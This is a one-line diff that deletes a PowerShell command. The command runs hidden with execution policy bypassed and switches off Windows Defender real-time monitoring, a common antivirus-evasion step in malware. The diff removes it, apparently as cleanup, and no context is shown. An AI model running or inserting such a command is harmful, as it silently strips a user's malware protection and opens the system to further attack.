@@ -1,1 +1,0 @@
-powershell -NonI -NoP -ep ByPass -W hidden Set-MpPreference -DisableRealtimeMonitoring $true; 
